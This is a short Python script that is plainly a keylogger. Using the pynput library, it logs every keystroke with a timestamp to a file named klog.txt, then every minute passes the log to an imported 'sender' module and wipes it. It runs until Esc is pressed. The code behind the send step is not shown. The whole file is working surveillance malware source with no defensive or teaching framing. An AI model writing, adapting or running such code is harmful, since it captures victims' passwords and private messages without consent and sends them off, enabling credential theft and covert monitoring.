#!/usr/bin/env python3

from pynput import keyboard
from datetime import datetime
import sender
import schedule
import time
import threading

running = True

def on_press(key):
    with open('klog.txt', 'a') as f:
        try:
            f.write(f'at: {datetime.now()} pressed: {key.char}\n')
        except AttributeError:
            f.write(f'at: {datetime.now()} pressed: {key}\n')

def on_release(key):
    global running
    if key == keyboard.Key.esc:
        running = False
        return False

def clear_log():
    with open('klog.txt', 'w') as log:
        log.truncate()

def loop():
    sender.send_log()
    clear_log()

def schedule_loop():
    while running:
        schedule.run_pending()
        time.sleep(1)

schedule.every(1).minute.do(loop)
schedule_thread = threading.Thread(target=schedule_loop)
schedule_thread.start()


try:
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    listener.join()
finally:
    schedule_thread.join()
